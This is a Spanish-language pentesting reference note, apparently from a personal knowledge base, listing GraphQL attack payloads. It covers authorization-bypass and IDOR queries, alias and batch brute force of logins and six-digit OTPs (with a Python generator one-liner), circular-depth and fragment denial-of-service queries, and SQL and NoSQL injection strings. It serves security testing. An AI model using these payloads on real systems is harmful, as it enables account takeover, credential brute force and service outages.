---
tipo: meta
aliases:
  - explotación GraphQL
  - GraphQL batching payloads
  - GraphQL injection
tags:
  - meta/referencia
  - dominio/web
---

# GraphQL - matriz de explotación

> [!info] Referencia pura, no un zettel
> Qué construir una vez que se tiene el esquema. Sacarlo es el paso previo, en [[GraphQL - matriz de reconocimiento]]; el criterio, en las cuatro notas de `600-tradecraft/`.

## 1. Autorización — pedir lo que no se ofrece

Ver [[GraphQL - autorización rota en resolvers]]. Con el esquema, se prueba cada campo y mutación sensible.

Campos no expuestos en la interfaz:

```graphql
{ user(id:"123") { id username email passwordHash isAdmin } }
```

Mutaciones no listadas:

```graphql
mutation { setRole(userId:"123", role:"admin") { id role } }
mutation { deleteUser(id:"456") { ok } }
```

Acceso por relación —IDOR a través del grafo:

```graphql
{ myOrder(id:"mine") { user { id email otherOrders { id total } } } }
```

El método de prueba es el de [[Control de acceso - matriz de pruebas]]: repetir cada consulta con cuentas de distinto rol y comparar qué responde.

## 2. Lotes y alias — saltar límites por petición

Ver [[GraphQL - lotes y alias]].

**Alias** — el mismo campo muchas veces en una consulta:

```graphql
{
  a: login(user:"admin", password:"1234") { token }
  b: login(user:"admin", password:"1235") { token }
  c: login(user:"admin", password:"1236") { token }
}
```

**Fuerza bruta de OTP** de seis dígitos, generando los alias con un script:

```graphql
{
  a0: verify2fa(code:"000000") { token }
  a1: verify2fa(code:"000001") { token }
  # … hasta 999999, repartido en peticiones grandes
}
```

**Lote JSON** —si el servidor acepta array de operaciones:

```json
[
  {"query":"mutation{login(user:\"admin\",password:\"a\"){token}}"},
  {"query":"mutation{login(user:\"admin\",password:\"b\"){token}}"}
]
```

Generar los alias:

```sh
python3 -c 'print("{" + " ".join(f"a{i}:login(user:\"admin\",password:\"{i}\"){{token}}" for i in range(1000)) + "}")'
```

## 3. Denegación por complejidad

Ver [[GraphQL - denegación por complejidad]].

> [!danger] Probar con profundidad creciente, parar al primer signo de carga
> Empezar en tres niveles y subir de a uno midiendo el tiempo. No llegar a la caída en un objetivo real.

**Profundidad circular** —sobre un ciclo `User ↔ Post`:

```graphql
{ user(id:"1") { posts { author { posts { author { posts { author { id } } } } } } } }
```

**Amplitud con alias** —un campo caro repetido:

```graphql
{ a:expensiveField b:expensiveField c:expensiveField d:expensiveField }
```

**Fragmentos anidados** —otra forma de multiplicar:

```graphql
query { ...f }
fragment f on Query { user { posts { author { ...f } } } }
```

Algunos servidores rechazan fragmentos circulares por esquema; vale probar los tres.

## 4. Inyección a través de argumentos

GraphQL es un vector, no la vulnerabilidad: si un argumento llega sin sanear a una consulta, la clase es la de esa inyección. El argumento es el punto de entrada; el payload sale del dominio correspondiente.

| Argumento sospechoso | Probar | Dominio |
|---|---|---|
| `filter`, `where`, `search` | Comillas, operadores SQL | [[MOC - SQL injection]] |
| `id`, `orderBy` en NoSQL | Operadores de Mongo (`$ne`, `$gt`) | NoSQL, sin modelar aún |
| Argumento que arma un comando | Metacaracteres de shell | [[MOC - Command injection]] |
| Argumento con una URL | Destino interno | [[MOC - SSRF]] |
| Argumento reflejado en la respuesta | Payload de XSS | [[MOC - Cross-site scripting]] |

```graphql
{ users(filter:"' OR '1'='1") { id } }
{ product(id:{"$ne":null}) { name } }
```

La inyección por GraphQL se prueba igual que en cualquier parámetro; lo único que cambia es que el punto de entrada es un argumento del esquema, que la introspección ya listó.

## 5. Sondear defensas

| Prueba | Qué revela |
|---|---|
| Consulta con 100 alias del mismo campo | ¿Hay límite de alias/operaciones? |
| Consulta a 15 niveles de profundidad | ¿Hay límite de profundidad? |
| Lote de 2 operaciones | ¿Acepta lotes? |
| `__schema` directo | ¿Introspección abierta? |
| Campo mal escrito | ¿Sugerencia activa? |
| GET con `?query=` | ¿Cacheable? |

Este sondeo decide qué ramas están abiertas antes de invertir en cada una.

## 6. Tabla de errores

| Lo que ves | Qué pasa |
|---|---|
| El campo sensible devuelve `null` sin error | Existe pero el resolver filtró: autz presente ahí |
| El campo sensible responde | Autz ausente — hallazgo |
| El alias devuelve un solo resultado | El servidor colapsa alias iguales; usar variables distintas |
| El lote da `400` | No soporta lotes; ir a alias |
| La consulta profunda da `query is too complex` | Hay límite de complejidad. Buena mitigación |
| `max depth exceeded` | Límite de profundidad activo |
| La inyección no dispara | El argumento se parametriza; probar otro |
| El OTP no se agota | Se invalida al primer fallo, o hay límite por operación |

## Relacionadas

[[MOC - GraphQL]] · [[GraphQL - matriz de reconocimiento]] · [[Control de acceso - matriz de pruebas]] · [[SQLi contextos - matriz de referencia]]
